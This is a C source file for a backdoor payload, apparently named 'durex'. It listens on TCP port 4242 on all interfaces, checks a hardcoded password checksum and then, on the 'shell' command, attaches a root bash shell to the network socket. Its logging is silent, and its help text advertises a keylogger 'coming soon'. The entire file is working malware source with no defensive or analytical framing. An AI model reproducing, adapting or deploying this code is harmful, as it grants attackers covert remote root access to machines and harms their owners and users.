#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <stddef.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include "utils.h"
#include "errors.h"

# define DUREX_MAX_QUEUE	3
# define USAGE			"commands:\n"\
				"  shell  -- spawns a shell with root privileges\n"\
				"  keylog -- launch the keylogger (coming soon)\n"\
				"  exit   -- disconnect\n"\
				"  help   -- show this dialog\n"

/* ---------------------------- sockets handling ---------------------------- */

static int	socket_init(int port)
{
	struct sockaddr_in	sockaddr;

	int	sock = socket(PF_INET, SOCK_STREAM, 0);

	if (sock == -1)
		silent_fatal("failed to create socket");

	//for faster server relaunch
	if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int)) < 0)
		silent_fatal("failed to set socket options");

	sockaddr.sin_family = PF_INET;
	sockaddr.sin_addr.s_addr = INADDR_ANY;
	sockaddr.sin_port = htons(port);

	if (bind(sock, (struct sockaddr *)&sockaddr , sizeof(sockaddr)) < 0)
		silent_fatal("failed to bind socket");

	if (listen(sock, DUREX_MAX_QUEUE) == -1)
		silent_fatal("failed to listen on socket");

	return sock;
}

static void	socket_close(int sock)
{
	shutdown(sock, SHUT_RDWR);
	close(sock);
}

static ssize_t	recv_or_die(int sock, void *buffer, size_t len)
{
	ssize_t	ret = recv(sock, buffer, len, 0);
	if (ret == -1)
	{
		socket_close(sock);
		silent_fatal("failed to recv data on socket");
	} else if (ret == 0) {
		socket_close(sock);
		silent_log("remote closed its end of the socket, terminating...");
		exit(EXIT_SUCCESS);
	}
	return ret;
}

static ssize_t	send_or_die(int sock, const void *buffer, size_t len)
{
	ssize_t	ret = send(sock, buffer, len, 0);
	if (ret == -1)
	{
		socket_close(sock);
		silent_fatal("failed to send data on socket");
	}
	return ret;
}

/* ------------------------------ remote shell ------------------------------ */

static int	remote_shell(int sock)
{
	pid_t	pid = fork();

	if (pid == -1)
	{
		silent_error("failed to fork");
		return -1;
	} else if (pid == 0) {
		const char	*path = "/bin/bash";
		char *const	argv[] = {NULL};

		if (dup2(sock, 0) == -1 || dup2(sock, 1) == -1 || dup2(sock, 2) == -1)
		{
			silent_error("failed to duplicate file descriptors");
			return -1;
		}
		if (execv(path, argv) == -1)
		{
			silent_error("failed to launch shell");
			return -1;
		}
	}
	waitpid(pid, NULL, 0);
	return 0;
}

/* --------------------------------- prompt --------------------------------- */

static void	input_password(int sock)
{
	while (1)
	{
		char	input[32] = {0};

		send_or_die(sock, "input password: ", 16);

		ssize_t		len = recv_or_die(sock, input, sizeof(input));
		uint64_t	sum = checksum(input, len);

		if (sum == 18446744073709551299LU) // unicorn emoji checksum
			break ;
		else
			send_or_die(sock, "wrong password.\n", 16);
	}
}

static void	input_command(int sock)
{
	send_or_die(sock, USAGE, sizeof(USAGE));

	while (1)
	{
		char	input[32] = {0};

		send_or_die(sock, "durex$ ", 7);
		recv_or_die(sock, input, sizeof(input));

		if (!strncmp("shell", input, 5))
		{
			send_or_die(sock, "starting shell..\n", 17);
			if (remote_shell(sock) == -1)
				send_or_die(sock, "failed spawning shell..\n", 24);
		}
		else if (!strncmp("help", input, 4) || !strncmp("h", input, 1))
		{
			send_or_die(sock, USAGE, sizeof(USAGE));
		}
		else if (!strncmp("quit", input, 4) || !strncmp("exit", input, 4))
		{
			send_or_die(sock, "goodbye.\n", 9);
			socket_close(sock);
			exit(EXIT_SUCCESS);
		}
	}
}

static void	prompt(int sock)
{
	input_password(sock);
	input_command(sock);
}

/* ---------------------------------- loop ---------------------------------- */

static void	accept_loop(int sock)
{
	struct sockaddr_in	client;
	int			client_sock;
	socklen_t		socklen;
	pid_t			pid;

	while (1)
	{
		socklen = sizeof(struct sockaddr_in);
		client_sock = accept(sock, (struct sockaddr *)&client, \
			(socklen_t*)&socklen);

		if (client_sock == -1)
		{
			silent_error("failed to accept connection");
			continue ;
		}
		pid = fork();
		if (pid == -1)
		{
			silent_error("failed to fork a new server");
			socket_close(client_sock);
			continue ;
		}
		if (pid == 0)
		{
			silent_log("starting prompt on client sock: %d...\n", client_sock);
			prompt(client_sock);
		}
	}
}

/* -------------------------------- payload --------------------------------- */

__attribute__((noreturn))
void	payload(void)
{
	silent_log("creating socket...\n");
	int	sock = socket_init(4242);

	silent_log("starting accept loop on socket %d...\n", sock);
	accept_loop(sock);

	silent_log("closing socket %d\n", sock);
	close(sock);
	exit(EXIT_SUCCESS);
}
